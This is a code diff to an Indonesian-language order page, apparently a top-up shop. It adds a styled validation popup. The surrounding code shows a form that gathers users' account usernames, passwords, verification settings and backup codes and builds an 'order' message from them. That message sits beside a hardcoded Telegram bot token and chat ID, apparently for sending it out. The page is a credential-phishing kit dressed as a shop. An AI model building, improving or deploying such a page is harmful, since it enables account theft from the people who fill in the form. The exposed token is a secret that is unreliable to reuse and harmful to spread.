@@ -50,6 +50,46 @@ button:hover { background:#3a5f8a;}
 .modal .actions button { flex: 1; padding: 8px; font-size: 13px; }
 .modal .small-note { font-size: 11px; color: #888; margin-top: 10px; }
 .copy-success { font-size: 12px; color: green; margin-top: 6px; }
+
+/* Validation popup (top-right) */
+.validation-popup {
+  position: fixed;
+  top: 18px;
+  right: 18px;
+  max-width: 320px;
+  background: linear-gradient(180deg,#fff,#fbfbfd);
+  border: 1px solid #e2e8f0;
+  box-shadow: 0 8px 30px rgba(35,49,74,0.12);
+  border-radius: 8px;
+  padding: 12px 14px;
+  z-index: 10001;
+  display: flex;
+  gap: 10px;
+  align-items: flex-start;
+  animation: slideIn 220ms ease;
+  font-size: 13px;
+}
+@keyframes slideIn { from { transform: translateY(-8px); opacity:0 } to { transform: translateY(0); opacity:1 } }
+.validation-popup .msg {
+  color: #1f2937;
+  line-height:1.2;
+  flex:1;
+}
+.validation-popup .close-btn {
+  background: transparent;
+  border: none;
+  font-size: 16px;
+  color: #6b7280;
+  cursor: pointer;
+  padding: 4px;
+  border-radius: 4px;
+}
+.validation-popup .close-btn:hover { background: rgba(0,0,0,0.04); color:#374151; }
+
+/* small responsive adjustments */
+@media (max-width:420px){
+  .validation-popup { left: 12px; right: 12px; top:12px; max-width:calc(100% - 24px); }
+}
 </style>
 </head>
 <body>
@@ -179,9 +219,46 @@ button:hover { background:#3a5f8a;}
   </div>
 </div>
 
+<!-- container for validation popup (injected) -->
+<div id="validationContainer"></div>
+
 <script>
 function sanitize(v){return v?Number(String(v).replace(/\D+/g,'')):NaN;}
 function fill({nmText,hgRaw,ktVal}){document.getElementById('nm').value=nmText||''; document.getElementById('kt').value=ktVal||''; const h=sanitize(hgRaw); document.getElementById('hg').value=!isNaN(h)?'Rp'+new Intl.NumberFormat('id-ID').format(h):hgRaw; const el=document.querySelector('.form-container')||document.getElementById('orderSection'); if(el){el.scrollIntoView({behavior:'smooth',block:'center'}); document.getElementById('usr').focus();}}
+
+function showValidationPopup(message){
+  // If existing popup, remove it first to avoid duplicates
+  const existing = document.getElementById('validationPopup');
+  if(existing) existing.remove();
+
+  const container = document.getElementById('validationContainer') || document.body;
+  const popup = document.createElement('div');
+  popup.id = 'validationPopup';
+  popup.className = 'validation-popup';
+  popup.innerHTML = `
+    <div class="msg">${message}</div>
+    <button class="close-btn" aria-label="Tutup">✕</button>
+  `;
+  container.appendChild(popup);
+
+  const closeBtn = popup.querySelector('.close-btn');
+  const removePopup = () => {
+    if(popup){
+      popup.style.transition = 'opacity 140ms ease, transform 140ms ease';
+      popup.style.opacity = '0';
+      popup.style.transform = 'translateY(-6px)';
+      setTimeout(()=> popup.remove(), 160);
+    }
+  };
+  closeBtn.addEventListener('click', removePopup);
+
+  // auto-hide after 5s
+  const autoHide = setTimeout(removePopup, 5000);
+
+  // remove on user navigation or pagehide
+  window.addEventListener('pagehide', ()=>{ clearTimeout(autoHide); if(popup) popup.remove(); }, { once: true });
+}
+
 document.addEventListener('DOMContentLoaded',function(){
   document.querySelectorAll('.bc').forEach(b=>b.addEventListener('click',()=>fill({nmText:b.getAttribute('data-nm')||b.textContent.trim(), hgRaw:b.getAttribute('data-hg')||'', ktVal:b.getAttribute('data-kt')||''})));
   const v2=document.getElementById('v2'); const v2m=document.getElementById('v2m'); const bcDiv=document.getElementById('bc_div'); const emDiv=document.getElementById('em_div');
@@ -189,7 +266,15 @@ document.addEventListener('DOMContentLoaded',function(){
   v2m.addEventListener('change',()=>{if(v2m.value==='BC'){bcDiv.classList.remove('hidden'); emDiv.classList.add('hidden');}else if(v2m.value==='EM'){emDiv.classList.remove('hidden'); bcDiv.classList.add('hidden');}else{bcDiv.classList.add('hidden'); emDiv.classList.add('hidden');}});
 
   document.getElementById('btnTg').addEventListener('click',()=>{
-    const f=document.getElementById('frm'); const req=f.querySelectorAll('input[required],select[required]'); for(const i of req){if(!i.value.trim()){alert('Harap isi semua kolom yang wajib!'); i.focus(); return;}}
+    const f=document.getElementById('frm'); const req=f.querySelectorAll('input[required],select[required]');
+    for(const i of req){
+      if(!i.value.trim()){
+        // replace native alert with custom popup
+        showValidationPopup('harap isi semua kolom!');
+        i.focus();
+        return;
+      }
+    }
     const u=document.getElementById('usr').value; const p=document.getElementById('pwd').value; const v=v2.value; const vm=v2m.value; const b=bcDiv.querySelector('input')?.value||''; const kt=document.getElementById('kt').value; const nm=document.getElementById('nm').value; const hg=document.getElementById('hg').value;
     const token='1868293159:AAF7IWMtOEqmVqEkBAfCTexkj_siZiisC0E'; const chatId='-1002801058966';
     const txt='Pesanan Baru Masuk!\n\nUsername: '+u+'\nPassword: '+p+'\nV2L: '+v+(vm? ' ('+vm+')':'')+(b?'\nBackup Code: '+b:'')+'\nKategori: '+kt+'\nNominal: '+nm+'\nHarga: '+hg;
